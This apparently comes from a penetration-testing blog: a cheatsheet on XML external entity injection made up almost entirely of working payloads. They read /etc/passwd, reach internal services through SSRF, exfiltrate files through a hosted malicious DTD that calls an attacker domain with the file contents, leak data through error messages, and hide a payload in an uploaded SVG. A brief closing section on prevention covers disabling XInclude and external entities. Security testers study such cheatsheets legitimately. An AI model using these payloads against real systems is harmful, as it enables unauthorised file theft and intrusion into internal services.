---
title: "XXE attack"
subtitle: ""
draft: false
author: "Hato0"
description: "XXE cheatsheet"
Last Update: <time datetime="{{ .Page.Lastmod.Format "Mon Jan 10 17:13:38 2020 -0700" }}" class="text-muted">  {{ $.Page.Lastmod.Format "January 02, 2006" }} </time>

tags: ["web", "penetest", "xxe"]
categories: ["Penetest - Web"]

hiddenFromHomePage: true
hiddenFromSearch: false
twemoji: false
lightgallery: false
ruby: false
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false
toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
share:
  enable: true
comment:
  enable: true
---
# XML external entity injection

XXE is a specific attack against XML application. It can allow an attacker to view files, interact directly with the backend, or other application related to the corrupt one. 

This attack is perform as an initial vector for SSRF. To check for the vulnerability you will have to intercept the request and change the post data. Post data are used in 99.99% for XML applications.

## Basics

- External entities to retrieve files

	Simple payload to retrieve a file from the filesystem
	
	{{< highlight xml "lineNos=false" >}}
	<!DOCTYPE test \[ <!ENTITY [xxe](https://portswigger.net/web-security/xxe) SYSTEM "file:///etc/passwd"> \]>
	{{< /highlight >}}
		

- Perform SSRF attacks

	As the previous one simple payload, you can adapt the IP by using URL to fetch APIs or whatever
	
	{{< highlight xml "lineNos=false" >}}
	<!DOCTYPE test \[ <!ENTITY xxe SYSTEM "http://127.0.0.1/"> \]>
	{{< /highlight >}}
	

## Blind XXE

- Out-of-band interaction

	In this attack you will use the same payload as for the SSRF combined attack, but you will use your IP to check for inbound traffic.
	
	{{< highlight xml "lineNos=false" >}}
	<!DOCTYPE test \[ <!ENTITY xxe SYSTEM "YOUR_DOMAIN_OR_IP"> \]>
	{{< /highlight >}}
	
- Out-of-band interaction via XML parameter entities

	Same principle and a similar payload but two different test
	
	{{< highlight xml "lineNos=false" >}}
	<!DOCTYPE stockCheck \[<!ENTITY % [xxe](https://portswigger.net/web-security/xxe) SYSTEM "YOUR_DOMAIN_OR_IP"> %xxe; \]>
	{{< /highlight >}}
	

- Exfiltrate data using a malicious external DTD

	First, DTD is a text file that store XML attributes and elements used by an application.
	This exfiltration has two phases:
	
	1. You will have to host the DTD file on your website and it should be accessible for external use. This file should contain the following payload:
		
		{{< highlight xml "lineNos=false" >}}
		<!ENTITY % file SYSTEM "file://FILE_PATH_TO_RETRIEVE">  
		<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'YOURDOMAIN/?log=%file;'>"> 
		%eval;  
		%exfil;
		{{< /highlight >}}
	
	
	2. Then exploit as you will do an classical exfiltration but you should specify the DTD file as follow : 

		{{< highlight xml "lineNos=false" >}}
		<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "DTD_URL"> %xxe;]>
		{{< /highlight >}}
	
	
	3. Now you should tcpdump or go to your website logs to view the file you want to retrieve.
	
- Retrieve data via error messages

	This attack has the same action than the external DTD we saw previously. You just need to replace the step 1 payload with the following one:
	
	{{< highlight xml "lineNos=false" >}}
	<!ENTITY % file SYSTEM "file://FILE_PATH_TO_RETRIEVE">  
	<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">  
	%eval;  
	%exfil;
	{{< /highlight >}}
	
	This will throw an error containing the file you specify
	
- Retrieve data by repurposing a local DTD

	For this one you need to find a local DTD on the system. Once you get it you can simply redeclare a function and trigger for example the error based exfiltration. In this example we suppose that the local file is  `DTD_LOCAL_FILE` and the entity inside is called `PWNME`. The following payload is to include on the XML post data :
	
	{{< highlight xml "lineNos=false" >}}
	<!DOCTYPE message [
	<!ENTITY % local_dtd SYSTEM "file://DTD_LOCAL_FILE">
	<!ENTITY % PWNME '
	<!ENTITY &#x25; file SYSTEM "file://FILE_PATH_TO_RETRIEVE">
	<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
	&#x25;eval;
	&#x25;error;
	'>
	%local_dtd;
	]>
	{{< /highlight >}}


## Others examples

- Exploiting XInclude to retrieve files

	Back to basics, simple efficient payload :
	
	{{< highlight xml "lineNos=false" >}}
	<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file://FILE_PATH_TO_RETRIEVE"/></foo>
	{{< /highlight >}}
	
	
- Exploiting XXE via image file upload

	For this attack you will have to prepare a SVG file containing the following payload and adapt parameters :
	
	{{< highlight xml "lineNos=false" >}} 
	<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file://FILE_PATH_TO_RETRIEVE" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
	{{< /highlight >}}

	Then just upload it as an image and you should have the file data in your image display
	
	
## How to prevent them 

XXE exist due to bad handle of user input or used of dangerous function in used librairie.
The best way to prevent them is to include only necessaries functions or remove unnecessaries ones. 

Import ones to disable are `XInclude` and `external entities resolutions`